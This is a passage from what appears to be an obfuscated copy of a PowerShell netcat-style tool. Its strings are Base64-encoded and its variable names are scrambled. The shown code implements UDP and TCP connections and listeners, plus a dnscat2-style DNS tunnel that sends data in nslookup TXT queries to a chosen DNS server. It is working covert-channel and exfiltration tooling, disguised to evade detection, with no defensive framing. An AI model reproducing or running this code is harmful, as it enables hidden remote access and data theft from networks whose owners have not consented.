          ${/\______/=\/====\} = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))].Client.EndReceiveMessageFrom(${__/\/\_/=\_/\/=\_},[ref]([System.Net.Sockets.SocketFlags]::None),[ref]${/\______/\/=\__/\},[ref]${_/=\_/==\_/\/==\/})
          Write-Verbose ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdABpAG8AbgAgAGYAcgBvAG0AIABbAA=='))) + ${/\______/\/=\__/\}.Address.IPAddressToString + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XQAgAHAAbwByAHQAIAA='))) + $p + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABbAHUAZABwAF0AIABhAGMAYwBlAHAAdABlAGQAIAAoAHMAbwB1AHIAYwBlACAAcABvAHIAdAAgAA=='))) + ${/\______/\/=\__/\}.Port + ")")
          if(${/\______/=\/====\} -gt 0){break}
          else{break}
        }
      }
      ${_/\/=\/\__/\_____}.Stop()
      $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABpAGEAbABDAG8AbgBuAGUAYwB0AGkAbwBuAEIAeQB0AGUAcwA=')))] = ${_/\/\/==\/\_/==\_}[0..([int]${/\______/=\/====\}-1)]
    }
    else
    {
      if(!$c.Contains("."))
      {
        ${_/=\/\_/=\__/====} = @()
        [System.Net.Dns]::GetHostAddresses($c) | ? {$_.AddressFamily -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAE4AZQB0AHcAbwByAGsA')))} | %{${_/=\/\_/=\__/====} += $_.IPAddressToString}
        Write-Verbose ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQAgAA=='))) + $c + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAByAGUAcwBvAGwAdgBlAGQAIAB0AG8AIABhAGQAZAByAGUAcwBzACAA'))) + ${_/=\/\_/=\__/====}[0])
        ${/\______/\/=\__/\} = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse(${_/=\/\_/=\__/====}[0])), $p
      }
      else
      {
        ${/\______/\/=\__/\} = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($c)), $p
      }
      $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))] = New-Object System.Net.Sockets.UDPClient
      $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))].Connect($c,$p)
      Write-Verbose ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABpAG4AZwAgAFUARABQACAAdAByAGEAZgBmAGkAYwAgAHQAbwAgAA=='))) + $c + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABwAG8AcgB0ACAA'))) + $p + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAuAC4A'))))
      Write-Verbose ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBEAFAAOgAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABvACAAcwBlAG4AZAAgAHMAbwBtAGUAIABkAGEAdABhACAAcwBvACAAdABoAGUAIABzAGUAcgB2AGUAcgAgAGMAYQBuACAAbgBvAHQAaQBjAGUAIAB5AG8AdQAhAA=='))))
    }
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIAUwBpAHoAZQA=')))] = 65536
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGQAUABvAGkAbgB0AA==')))] = ${/\______/\/=\__/\}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0ARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))] = New-Object System.Byte[] $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIAUwBpAHoAZQA=')))]
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))] = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))].Client.BeginReceiveFrom($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0ARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))],0,$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIAUwBpAHoAZQA=')))],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGQAUABvAGkAbgB0AA==')))],$null,$null)
    return $FuncVars
  }
  function ReadData_UDP
  {
    param($FuncVars)
    $Data = $null
    if($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))].IsCompleted)
    {
      ${/===\/=\___/\___/} = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))].Client.EndReceiveFrom($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))],[ref]$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGQAUABvAGkAbgB0AA==')))])
      if(${/===\/=\___/\___/} -eq 0){break}
      $Data = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0ARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))][0..([int]${/===\/=\___/\___/}-1)]
      $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0AUgBlAGEAZABPAHAAZQByAGEAdABpAG8AbgA=')))] = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))].Client.BeginReceiveFrom($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAZQBhAG0ARABlAHMAdABpAG4AYQB0AGkAbwBuAEIAdQBmAGYAZQByAA==')))],0,$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIAUwBpAHoAZQA=')))],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGQAUABvAGkAbgB0AA==')))],$null,$null)
    }
    return $Data,$FuncVars
  }
  function WriteData_UDP
  {
    param($Data,$FuncVars)
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))].Client.SendTo($Data,$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGQAUABvAGkAbgB0AA==')))]) | Out-Null
    return $FuncVars
  }
  function Close_UDP
  {
    param($FuncVars)
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))].Close()
  }
  function Setup_DNS
  {
    param($FuncSetupVars)
    if(${global:_/======\/\/\/==\}){${_/======\/\/\/==\} = $True}
    function ConvertTo-HexArray
    {
      param($String)
      ${_/==\__/=\/\/\/=\} = @()
      $String.ToCharArray() | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAeAB9AA=='))) -f [byte]$_} | % {if($_.Length -eq 1){"0" + [string]$_} else{[string]$_}} | % {${_/==\__/=\/\/\/=\} += $_}
      return ${_/==\__/=\/\/\/=\}
    }
    function SendPacket
    {
      param($Packet,$DNSServer,$DNSPort)
      ${/==\_______/==\__} = ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAHQAIAB0AHkAcABlAD0AVABYAFQACgBzAGUAcgB2AGUAcgAgACQARABOAFMAUwBlAHIAdgBlAHIACgBzAGUAdAAgAHAAbwByAHQAPQAkAEQATgBTAFAAbwByAHQACgBzAGUAdAAgAGQAbwBtAGEAaQBuAD0ALgBjAG8AbQAKAHMAZQB0ACAAcgBlAHQAcgB5AD0AMQAKAA=='))) + $Packet + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBlAHgAaQB0AA=='))))
      ${_/=\__/==\_/=====} = (${/==\_______/==\__} | nslookup 2>&1 | Out-String)
      if(${_/=\__/==\_/=====}.Contains('"')){return ([regex]::Match(${_/=\__/==\_/=====}.replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBpAG8APQA='))),""),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/ADwAPQAiACkAWwBeACIAXQAqACgAPwA9ACIAKQA=')))).Value)}
      else{return 1}
    }
    function Create_SYN
    {
      param($SessionId,$SeqNum,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "00" + $SessionId + $SeqNum + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAA='))) + $Domain)
    }
    function Create_FIN
    {
      param($SessionId,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "02" + $SessionId + "00" + $Domain)
    }
    function Create_MSG
    {
      param($SessionId,$SeqNum,$AcknowledgementNumber,$Data,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "01" + $SessionId + $SeqNum + $AcknowledgementNumber + $Data + $Domain)
    }
    function DecodePacket
    {
      param($Packet)
      if((($Packet.Length)%2 -eq 1) -or ($Packet.Length -eq 0)){return 1}
      $AcknowledgementNumber = ($Packet[10..13] -join "")
      $SeqNum = ($Packet[14..17] -join "")
      [byte[]]$ReturningData = @()
      if($Packet.Length -gt 18)
      {
        ${_/=\/\/=\____/\__} = $Packet.Substring(18)
        while(${_/=\/\/=\____/\__}.Length -gt 0)
        {
          $ReturningData += [byte[]][Convert]::ToInt16((${_/=\/\/=\____/\__}[0..1] -join ""),16)
          ${_/=\/\/=\____/\__} = ${_/=\/\/=\____/\__}.Substring(2)
        }
      }
      return $Packet,$ReturningData,$AcknowledgementNumber,$SeqNum
    }
    function AcknowledgeData
    {
      param($ReturningData,$AcknowledgementNumber)
      ${_/==\__/=\/\/\/=\} = [string]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAeAB9AA=='))) -f (([uint16]("0x" + $AcknowledgementNumber) + $ReturningData.Length) % 65535))
      if(${_/==\__/=\/\/\/=\}.Length -ne 4){${_/==\__/=\/\/\/=\} = (("0"*(4-${_/==\__/=\/\/\/=\}.Length)) + ${_/==\__/=\/\/\/=\})}
      return ${_/==\__/=\/\/\/=\}
    }
    $FuncVars = @{}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAUwBlAHIAdgBlAHIA')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAUABvAHIAdAA=')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAB1AHIAZQBUAGgAcgBlAHMAaABvAGwAZAA=')))] = $FuncSetupVars
    if($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAUABvAHIAdAA=')))] -eq ''){$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAUABvAHIAdAA=')))] = "53"}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGcA')))] = ""
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ("." + $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))])
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAXwBTAFkATgA=')))] = ${function:Create_SYN}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAXwBNAFMARwA=')))] = ${function:Create_MSG}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAXwBGAEkATgA=')))] = ${function:Create_FIN}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGMAbwBkAGUAUABhAGMAawBlAHQA')))] = ${function:DecodePacket}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdgBlAHIAdABUAG8ALQBIAGUAeABBAHIAcgBhAHkA')))] = ${function:ConvertTo-HexArray}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGsARABhAHQAYQA=')))] = ${function:AcknowledgeData}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABQAGEAYwBrAGUAdAA=')))] = ${function:SendPacket}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAGQA')))] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHEATgB1AG0A')))] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGMAbwBkAGkAbgBnAA==')))] = New-Object System.Text.AsciiEncoding
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAB1AHIAZQBzAA==')))] = 0
    ${___/\_/=\/=\____/} = (icm $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAXwBTAFkATgA=')))] -ArgumentList @($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAGQA')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHEATgB1AG0A')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGcA')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]))
    ${___/\/\_/====\/\/} = (icm $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABQAGEAYwBrAGUAdAA=')))] -ArgumentList @(${___/\_/=\/=\____/},$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAUwBlAHIAdgBlAHIA')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAUABvAHIAdAA=')))]))
    ${_/\__/==\/=====\/} = (icm $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGMAbwBkAGUAUABhAGMAawBlAHQA')))] -ArgumentList @(${___/\/\_/====\/\/}))
    if(${_/\__/==\/=====\/} -eq 1){return $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAGQAIABTAFkATgAgAHIAZQBzAHAAbwBuAHMAZQAuACAARQBuAHMAdQByAGUAIAB5AG8AdQByACAAcwBlAHIAdgBlAHIAIABpAHMAIABzAGUAdAAgAHUAcAAgAGMAbwByAHIAZQBjAHQAbAB5AC4A')))}
    $ReturningData = ${_/\__/==\/=====\/}[1]
    if($ReturningData -ne ""){$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AEQAYQB0AGEA')))] = ""}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGsATgB1AG0A')))] = ${_/\__/==\/=====\/}[2]
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgATQBTAEcARABhAHQAYQBTAGkAegBlAA==')))] = (244 - (icm $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAXwBNAFMARwA=')))] -ArgumentList @($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAGQA')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHEATgB1AG0A')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGsATgB1AG0A')))],"",$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGcA')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))])).Length)
    if($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgATQBTAEcARABhAHQAYQBTAGkAegBlAA==')))] -le 0){return $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABuAGEAbQBlACAAaQBzACAAdABvAG8AIABsAG8AbgBnAC4A')))}
    return $FuncVars
  }
  function ReadData_DNS
  {
    param($FuncVars)
    if(${global:_/======\/\/\/==\}){${_/======\/\/\/==\} = $True}
    ${_/\/=\________/==} = @()
    ${_/\/=\/=\__/\/\_/} = ""
    if($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AEQAYQB0AGEA')))] -ne $null)
    {
      ${_/==\__/=\/\/\/=\} = (icm $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdgBlAHIAdABUAG8ALQBIAGUAeABBAHIAcgBhAHkA')))] -ArgumentList @($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AEQAYQB0AGEA')))]))
      ${__/\/=\_/==\/=\/=} = 0
      ${/=\/\/\/\_/\/=\/\} = 0
      foreach(${_/\/\_/\/=\_/\__/} in ${_/==\__/=\/\/\/=\})
      {
        if(${__/\/=\_/==\/=\/=} -ge 30)
        {
          ${__/\/=\_/==\/=\/=} = 0
          ${_/\/=\/=\__/\/\_/} += "."
        }
        if(${/=\/\/\/\_/\/=\/\} -ge ($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgATQBTAEcARABhAHQAYQBTAGkAegBlAA==')))]))
        {
          ${_/\/=\________/==} += ${_/\/=\/=\__/\/\_/}.TrimEnd(".")
          ${/=\/\/\/\_/\/=\/\} = 0
          ${__/\/=\_/==\/=\/=} = 0
          ${_/\/=\/=\__/\/\_/} = ""
        }
        ${_/\/=\/=\__/\/\_/} += ${_/\/\_/\/=\_/\__/}
        ${__/\/=\_/==\/=\/=} += 2
        ${/=\/\/\/\_/\/=\/\} += 2
      }
      ${_/\/=\/=\__/\/\_/} = ${_/\/=\/=\__/\/\_/}.TrimEnd(".")
      ${_/\/=\________/==} += ${_/\/=\/=\__/\/\_/}
      $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AEQAYQB0AGEA')))] = ""
    }
    else
    {
      ${_/\/=\________/==} = @("")
    }
    [byte[]]$ReturningData = @()
    foreach(${_/\/=\/=\__/\/\_/} in ${_/\/=\________/==})
    {
      try{${/====\_/==\_/==\_} = icm $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAXwBNAFMARwA=')))] -ArgumentList @($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAGQA')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHEATgB1AG0A')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGsATgB1AG0A')))],${_/\/=\/=\__/\/\_/},$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGcA')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))])}
      catch{ Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAQwBBAFQAMgA6ACAARgBhAGkAbABlAGQAIAB0AG8AIABjAHIAZQBhAHQAZQAgAHAAYQBjAGsAZQB0AC4A'))) ; $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAB1AHIAZQBzAA==')))] += 1 ; continue }
      try{$Packet = (icm $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABQAGEAYwBrAGUAdAA=')))] -ArgumentList @(${/====\_/==\_/==\_},$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAUwBlAHIAdgBlAHIA')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAUABvAHIAdAA=')))]))}
      catch{ Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAQwBBAFQAMgA6ACAARgBhAGkAbABlAGQAIAB0AG8AIABzAGUAbgBkACAAcABhAGMAawBlAHQALgA='))) ; $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAB1AHIAZQBzAA==')))] += 1 ; continue }
      try
      {
        ${_/\__/==\/=====\/} = (icm $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGMAbwBkAGUAUABhAGMAawBlAHQA')))] -ArgumentList @($Packet))
        if(${_/\__/==\/=====\/}.Length -ne 4){ Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAQwBBAFQAMgA6ACAARgBhAGkAbAB1AHIAZQAgAHQAbwAgAGQAZQBjAG8AZABlACAAcABhAGMAawBlAHQALAAgAGQAcgBvAHAAcABpAG4AZwAuAC4ALgA='))); $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAB1AHIAZQBzAA==')))] += 1 ; continue }
        $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGsATgB1AG0A')))] = ${_/\__/==\/=====\/}[2]
        $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHEATgB1AG0A')))] = ${_/\__/==\/=====\/}[3]
        $ReturningData += ${_/\__/==\/=====\/}[1]
      }
      catch{ Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAQwBBAFQAMgA6ACAARgBhAGkAbAB1AHIAZQAgAHQAbwAgAGQAZQBjAG8AZABlACAAcABhAGMAawBlAHQALAAgAGQAcgBvAHAAcABpAG4AZwAuAC4ALgA='))) ; $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAB1AHIAZQBzAA==')))] += 1 ; continue }
      if(${_/\__/==\/=====\/} -eq 1){ Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAQwBBAFQAMgA6ACAARgBhAGkAbAB1AHIAZQAgAHQAbwAgAGQAZQBjAG8AZABlACAAcABhAGMAawBlAHQALAAgAGQAcgBvAHAAcABpAG4AZwAuAC4ALgA='))) ; $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAB1AHIAZQBzAA==')))] += 1 ; continue }
    }
    if($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAB1AHIAZQBzAA==')))] -ge $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAB1AHIAZQBUAGgAcgBlAHMAaABvAGwAZAA=')))]){break}
    if($ReturningData -ne @())
    {
      $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGsATgB1AG0A')))] = (icm $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGsARABhAHQAYQA=')))] -ArgumentList @($ReturningData,$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGsATgB1AG0A')))]))
    }
    return $ReturningData,$FuncVars
  }
  function WriteData_DNS
  {
    param($Data,$FuncVars)
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AEQAYQB0AGEA')))] = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGMAbwBkAGkAbgBnAA==')))].GetString($Data)
    return $FuncVars
  }
  function Close_DNS
  {
    param($FuncVars)
    ${_/\____/===\_/\_/} = icm $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAXwBGAEkATgA=')))] -ArgumentList @($FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAGQA')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGcA')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))])
    icm $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABQAGEAYwBrAGUAdAA=')))] -ArgumentList @(${_/\____/===\_/\_/},$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAUwBlAHIAdgBlAHIA')))],$FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAUABvAHIAdAA=')))]) | Out-Null
  }
  function Setup_TCP
  {
    param($FuncSetupVars)
    $c,$l,$p,$t = $FuncSetupVars
    if(${global:_/======\/\/\/==\}){${_/======\/\/\/==\} = $True}
    $FuncVars = @{}
    if(!$l)
    {
      $FuncVars["l"] = $False
      ${_/=\/=\/\/\______} = New-Object System.Net.Sockets.TcpClient
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdABpAG4AZwAuAC4ALgA=')))
      ${_/\__/==\/===\_/\} = ${_/=\/=\/\/\______}.BeginConnect($c,$p,$null,$null)
    }
    else
    {
      $FuncVars["l"] = $True
      Write-Verbose ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABpAHMAdABlAG4AaQBuAGcAIABvAG4AIABbADAALgAwAC4AMAAuADAAXQAgACgAcABvAHIAdAAgAA=='))) + $p + ")")
      ${_/=\/=\/\/\______} = New-Object System.Net.Sockets.TcpListener $p
      ${_/=\/=\/\/\______}.Start()
      ${_/\__/==\/===\_/\} = ${_/=\/=\/\/\______}.BeginAcceptTcpClient($null, $null)
    }
    ${_/\/=\/\__/\_____} = [System.Diagnostics.Stopwatch]::StartNew()
    while($True)
    {
      if($Host.UI.RawUI.KeyAvailable)
      {
        if(@(17,27) -contains ($Host.UI.RawUI.ReadKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAEUAYwBoAG8ALABJAG4AYwBsAHUAZABlAEsAZQB5AEQAbwB3AG4ALABJAG4AYwBsAHUAZABlAEsAZQB5AFUAcAA=')))).VirtualKeyCode))
        {
          Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBUAFIATAAgAG8AcgAgAEUAUwBDACAAYwBhAHUAZwBoAHQALgAgAFMAdABvAHAAcABpAG4AZwAgAFQAQwBQACAAUwBlAHQAdQBwAC4ALgAuAA==')))
          if($FuncVars["l"]){${_/=\/=\/\/\______}.Stop()}
          else{${_/=\/=\/\/\______}.Close()}
          ${_/\/=\/\__/\_____}.Stop()
          break
        }
      }
      if(${_/\/=\/\__/\_____}.Elapsed.TotalSeconds -gt $t)
      {
        if(!$l){${_/=\/=\/\/\______}.Close()}
        else{${_/=\/=\/\/\______}.Stop()}
        ${_/\/=\/\__/\_____}.Stop()
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBvAHUAdAAhAA=='))) ; break
        break
      }
      if(${_/\__/==\/===\_/\}.IsCompleted)
      {
        if(!$l)
        {
          try
          {
            ${_/=\/=\/\/\______}.EndConnect(${_/\__/==\/===\_/\})
            ${_/\___/==\_/===\/} = ${_/=\/=\/\/\______}.GetStream()
            ${_/\/=\/\/\/====\_} = ${_/=\/=\/\/\______}.ReceiveBufferSize
            Write-Verbose ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdABpAG8AbgAgAHQAbwAgAA=='))) + $c + ":" + $p + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABbAHQAYwBwAF0AIABzAHUAYwBjAGUAZQBkAGUAZAAhAA=='))))
          }
          catch{${_/=\/=\/\/\______}.Close(); ${_/\/=\/\__/\_____}.Stop(); break}
        }
        else
        {
          ${_/=\_/==\___/\/==} = ${_/=\/=\/\/\______}.EndAcceptTcpClient(${_/\__/==\/===\_/\})
          ${_/\___/==\_/===\/} = ${_/=\_/==\___/\/==}.GetStream()
          ${_/\/=\/\/\/====\_} = ${_/=\_/==\___/\/==}.ReceiveBufferSize
